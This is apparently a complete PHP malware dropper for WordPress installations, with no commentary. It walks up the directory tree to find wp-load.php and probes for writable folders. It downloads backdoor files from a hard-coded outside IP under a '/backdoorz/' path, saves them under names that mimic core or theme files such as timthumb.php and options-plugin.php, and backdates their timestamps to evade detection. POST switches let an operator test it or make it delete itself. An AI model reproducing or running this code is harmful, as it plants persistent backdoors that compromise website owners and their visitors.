<?php
@ini_set('allow_url_fopen',          1); 
@ini_set('default_socket_timeout', 120);

unlink($dir.'/wp-feed.php');

if (isset($_POST['t']))
	die ("it "."works");

if (isset($_POST['d']))
	unlink (__FILE__);

	$dir = getcwd ();
	$files = glob ($dir."/wp-load.php");
	while (empty ($files) && "/" !== $dir && '' !== $dir) {
		$dir = dirname ($dir);
		$files = glob ($dir."/wp-load.php");
	}
	if(empty($files)):die();endif;
	$time = filemtime($files[0]);

function get_contentz($url) {
	if(function_exists('file_get_contents') && ini_get('allow_url_fopen') == 1 ){
		if ($data = @file_get_contents($url)) 
                	return $data;
	}elseif(function_exists('curl_init') ){
		if ($ch = @curl_init()) {

                	@curl_setopt($ch, CURLOPT_URL,              $url);
                	@curl_setopt($ch, CURLOPT_HEADER,           false);
                	@curl_setopt($ch, CURLOPT_RETURNTRANSFER,   true);
                	@curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,   60);
              
                	if ($data = @curl_exec($ch)) {
                	    return $data;
                	}
               
                	@curl_close($ch);
            	} 
	}else{
	  $url_parts = @parse_url( $url );
	  $documentpath = $url_parts["path"];
	  $documentpath .= "?" . $url_parts["query"];
	  $host = $url_parts["host"];
	  $port = $url_parts["port"];
	  $fp = fsockopen( $host, 80, $errno, $errstr, 5 );
	  if(!$fp) return '';
	  fwrite ($fp, "GET ".$documentpath." HTTP/1.0\r\nHost: $host\r\n\r\n");
	  while(!feof($fp)) $fcon.=fgets($fp, 10024);
	  fclose($fp);
	return $fcon;
	}
}

	function file_put_contentz($file,$data){		
		$f=@fopen($file, 'w');
		return @fwrite($f, $data);
		@fclose($f);
	}



function is__writable($path) {

    if ($path{strlen($path)-1}=='/') // recursively return a temporary file path
        return is__writable($path.uniqid(mt_rand()).'.tmp');
    else if (is_dir($path))
        return is__writable($path.'/'.uniqid(mt_rand()).'.tmp');
    // check tmp file for read/write capabilities
    $rm = file_exists($path);
    $f = @fopen($path, 'a');
    if ($f===false)
        return false;
    fclose($f);
    if (!$rm)
        unlink($path);
    return true;
}



if(is__writable($dir."/wp-includes/")):
	file_put_contentz($dir.'/wp-includes/page.php', get_contentz('http://67.211.195.81/backdoorz/page.php'));
	touch($dir.'/wp-includes/page.php', $time);
	die(";;/wp-includes/page.php;;true_upload");
endif;

if(is__writable($dir."/wp-content/themes/".get_settings('template')."/")){
	file_put_contentz($dir.'/wp-content/themes/'.get_settings('template').'/timthumb.php', get_contentz('http://67.211.195.81/backdoorz/timthumb.php'));
	touch($dir.'/wp-content/themes/'.get_settings('template').'/timthumb.php', $time);
	die(";;/wp-content/themes/".get_settings('template')."/timthumb.php;;true_upload");
}

if(is__writable($dir."/wp-admin/")):
	file_put_contentz($dir.'/wp-admin/options-plugin.php', get_contentz('http://67.211.195.81/backdoorz/wp-plugin.php'));
	touch($dir.'/wp-admin/options-plugin.php', $time);
	die(";;/wp-admin/options-plugin.php;;true_upload");
endif;

if(is__writable($dir."/")):
	file_put_contentz($dir.'/wp-plugin.php', get_contentz('http://67.211.195.81/backdoorz/wp-plugin.php'));
	touch($dir.'/wp-plugin.php', $time);
	die(";;/wp-plugin.php;;true_upload");
endif;

if(is__writable($dir."/wp-content/themes/")){
	file_put_contentz($dir.'/wp-content/themes/theme.php', get_contentz('http://67.211.195.81/backdoorz/page.php'));
	touch($dir.'/wp-content/themes/theme.php', $time);
	die(";;/wp-content/themes/theme.php;;true_upload");
}

if(is__writable($dir."/wp-content/uploads/")){
	file_put_contentz($dir.'/wp-content/uploads/timthumb.php', get_contentz('http://67.211.195.81/backdoorz/timthumb.php'));
	touch($dir.'/wp-content/uploads/timthumb.php', $time);
	die(";;/wp-content/uploads/timthumb.php;;true_upload");
}else{
	die(";;0;;false_upload");
}

?>
